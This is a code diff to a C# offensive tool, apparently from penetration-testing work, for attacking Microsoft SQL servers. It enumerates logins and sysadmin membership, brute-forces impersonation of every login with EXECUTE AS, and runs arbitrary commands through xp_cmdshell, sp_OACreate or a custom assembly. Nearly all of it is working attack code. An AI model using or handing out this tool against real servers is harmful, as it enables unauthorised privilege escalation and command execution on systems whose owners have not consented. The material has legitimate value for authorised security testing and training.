@@ -1,19 +1,23 @@
 using System;
+using System.Collections.Generic;
 using System.Data.SqlClient;
 
 // Execute arbitrary code or queries on remote SQL servers via xp_cmdshell, sp_OACreate, and a custom assembly
 // Usage:
 //xp_cmdshell
-//mssqlAuth.exe -h <target host> -e 1 -d <database> -l sa -c "<command>"
+//sqlExec.exe -h <target host> -e 1 -d <database> -l sa -c "<command>"
 
 //sp_OACreate
-//mssqlAuth.exe -h <target host> -e 2 -d<database> -c "<command>"
+//sqlExec.exe -h <target host> -e 2 -d<database> -c "<command>"
 
 //Custom Assembly
-//mssqlAuth.exe -h <target host> -e 3 -u dbo -d msdb` -c "<command>" 
+//sqlExec.exe -h <target host> -e 3 -u dbo -d msdb` -c "<command>" 
 
 //Custom Query
-//mssqlAuth.exe -h <target host> -u dbo -d msdb` -q "<query>"
+//sqlExec.exe -h <target host> -u dbo -d msdb` -q "<query>"
+
+//Attempt to enumerate all available logins
+//sqlExec.exe -h <target host> -la -q "select DB_NAME();"
 
 
 namespace SQL
@@ -29,6 +33,8 @@ namespace SQL
             String login = "";
             String user = "";
             String customQuery = "";
+            bool verbose = false;
+            bool loginAll = false;
 
             for (var i = 0; i < args.Length; i++)
             {
@@ -37,8 +43,10 @@ namespace SQL
                 else if (args[i] == "-c") { cmd = args[i + 1]; }
                 else if (args[i] == "-e") { execType = args[i + 1]; }
                 else if (args[i] == "-l") { login = args[i + 1]; }
+                else if (args[i] == "-la") { loginAll = true; }
                 else if (args[i] == "-u") { user = args[i + 1]; }
                 else if (args[i] == "-q") { customQuery = args[i + 1]; }
+                else if (args[i] == "-v") { verbose = true; }
             }
 
             if (sqlServer == "")
@@ -67,14 +75,38 @@ namespace SQL
 
             if (login != "")
             {
-                Console.WriteLine("Attempting login-based impersonation");
+                String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
+                command = new SqlCommand(querysysadminrole, con);
+                reader = command.ExecuteReader();
+                reader.Read();
+                Int32 sysadminrole = Int32.Parse(reader[0].ToString());
+                if (sysadminrole == 1)
+                {
+                    Console.WriteLine(user + " is a member of sysadmin role");
+                }
+                else
+                {
+                    Console.WriteLine(user + " is NOT a member of sysadmin role. Note that all linked SQL servers may not be displayed!");
+                }
+                reader.Close();
+                Console.WriteLine("");
+                string queryusers = "select * from master.sys.server_principals;";
+                command = new SqlCommand(queryusers, con);
+                reader = command.ExecuteReader();
+                Console.WriteLine("SQL users found:");
+                while (reader.Read())
+                {
+                    Console.WriteLine(reader[0]);
+                }
+                reader.Close();
+                Console.WriteLine("");
                 String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
                 command = new SqlCommand(query, con);
                 reader = command.ExecuteReader();
-
+                Console.WriteLine("Logins that can be impersonated (Remember to check dbo): ");
                 while (reader.Read() == true)
                 {
-                    Console.WriteLine("Logins that can be impersonated: " + reader[0]);
+                    Console.WriteLine(reader[0]);
                 }
                 reader.Close();
 
@@ -87,9 +119,20 @@ namespace SQL
                 reader.Close();
 
                 String executeas = "EXECUTE AS LOGIN = '" + login + "';";
-
-                command = new SqlCommand(executeas, con);
-                reader = command.ExecuteReader();
+                try
+                {
+                    command = new SqlCommand(executeas, con);
+                    reader = command.ExecuteReader();
+                }
+                catch (SqlException sqlEx)
+                {
+                    Console.WriteLine("Error impersonating login " + login+" Use -v for error info");
+                    if (verbose)
+                    {
+                        Console.WriteLine("Error impersonating login " + login + ":");
+                        Console.WriteLine(sqlEx.Message);
+                    }
+                }
                 reader.Close();
 
                 command = new SqlCommand(querylogin, con);
@@ -100,16 +143,129 @@ namespace SQL
                 reader.Close();
             }
 
-            else if (user != "")
+            if (loginAll)
             {
-                Console.WriteLine("Attempting user-based impersonation");
+                String querylogin = "SELECT SYSTEM_USER;";
+                command = new SqlCommand(querylogin, con);
+                reader = command.ExecuteReader();
+
+                reader.Read();
+                String username = (string)reader[0];
+                reader.Close();
+
+                String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
+                command = new SqlCommand(querysysadminrole, con);
+                reader = command.ExecuteReader();
+                reader.Read();
+                Int32 sysadminrole = Int32.Parse(reader[0].ToString());
+                if (sysadminrole == 1)
+                {
+                    Console.WriteLine(username +" is a member of sysadmin role");
+                }
+                else
+                {
+                    Console.WriteLine(username+" is NOT a member of sysadmin role. Note that all linked SQL servers may not be displayed!");
+                }
+                reader.Close();
+                Console.WriteLine("");
+                string queryusers = "select * from master.sys.server_principals;";
+                command = new SqlCommand(queryusers, con);
+                reader = command.ExecuteReader();
+                Console.WriteLine("SQL users found:");
+                List<String> logins = new List<String>();
+                while (reader.Read())
+                {
+                    Console.WriteLine(reader[0]);
+                    logins.Add((string)reader[0]);
+                }
+                reader.Close();
+                Console.WriteLine("");
                 String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
                 command = new SqlCommand(query, con);
                 reader = command.ExecuteReader();
+                Console.WriteLine("Logins that can be impersonated (Remember to check dbo): ");
 
+                
                 while (reader.Read() == true)
                 {
-                    Console.WriteLine("Logins that can be impersonated (Not usernames): " + reader[0]);
+                    Console.WriteLine(reader[0]);
+
+                }
+                reader.Close();
+
+                command = new SqlCommand(querylogin, con);
+                reader = command.ExecuteReader();
+
+                reader.Read();
+                Console.WriteLine("Before Impersonation, logged in as: " + reader[0]);
+                reader.Close();
+
+                for (int i = 0; i < logins.Count; i++)
+                {
+                    Console.WriteLine("\nAttempting to impersonate login " + logins[i]);
+                    String executeas = "EXECUTE AS LOGIN = '" + logins[i] + "';";
+                    try
+                    {
+                        command = new SqlCommand(executeas, con);
+                        reader = command.ExecuteReader();
+                        reader.Close();
+
+                        command = new SqlCommand(querylogin, con);
+                        reader = command.ExecuteReader();
+
+                        reader.Read();
+                        Console.WriteLine("After Impersonation, logged in as: " + reader[0]);
+                        reader.Close();
+
+                    }
+                    catch (SqlException sqlEx)
+                    {
+                        Console.WriteLine("Error impersonating login " + login + " Use -v for error info");
+                        if (verbose)
+                        {
+                            Console.WriteLine("Error impersonating login " + login + ":");
+                            Console.WriteLine(sqlEx.Message);
+                            reader.Close();
+                        }
+                    }
+                }
+            }
+
+            else if (user != "")
+            {
+                Console.WriteLine("Attempting user-based impersonation");
+                String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
+                command = new SqlCommand(querysysadminrole, con);
+                reader = command.ExecuteReader();
+                reader.Read();
+                Int32 sysadminrole = Int32.Parse(reader[0].ToString());
+                if (sysadminrole == 1)
+                {
+                    Console.WriteLine(user + " is a member of sysadmin role");
+                }
+                else
+                {
+                    Console.WriteLine(user + " is NOT a member of sysadmin role. Note that all linked SQL servers may not be displayed!");
+                }
+                reader.Close();
+                Console.WriteLine("");
+                string queryusers = "select * from master.sys.server_principals;";
+                command = new SqlCommand(queryusers, con);
+                reader = command.ExecuteReader();
+                Console.WriteLine("SQL users found:");
+                while (reader.Read())
+                {
+                    Console.WriteLine(reader[0]);
+                }
+                reader.Close();
+                Console.WriteLine("");
+                String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
+                command = new SqlCommand(query, con);
+                reader = command.ExecuteReader();
+                Console.WriteLine("Logins that can be impersonated (Remember to check /i:dbo!): ");
+                while (reader.Read() == true)
+                {
+                    Console.WriteLine(reader[0]);
                 }
                 reader.Close();
 
@@ -123,9 +279,21 @@ namespace SQL
 
                 String executeas = "EXECUTE AS USER = '" + user + "';";
 
-                command = new SqlCommand(executeas, con);
-                reader = command.ExecuteReader();
-                reader.Close();
+
+                try
+                {
+                    command = new SqlCommand(executeas, con);
+                    reader = command.ExecuteReader();
+                }
+                catch (SqlException sqlEx)
+                {
+                    Console.WriteLine("Error impersonating user " + user + " Use -v for error info");
+                    if (verbose)
+                    {
+                        Console.WriteLine("Error impersonating login " + user + ":");
+                        Console.WriteLine(sqlEx.Message);
+                    }
+                }
 
                 command = new SqlCommand(querylogin, con);
                 reader = command.ExecuteReader();
@@ -233,7 +401,7 @@ namespace SQL
             {
                 if (customQuery == "")
                 {
-                    Console.WriteLine("Please either specify a custom query with -q or an exec type with -e (either '1' for xp_cmdshell or '2' for sp_OACreate)");
+                    Console.WriteLine("Please specify an exec type with -e (either '1' for xp_cmdshell or '2' for sp_OACreate)");
                     Environment.Exit(0);
                 }
                 else
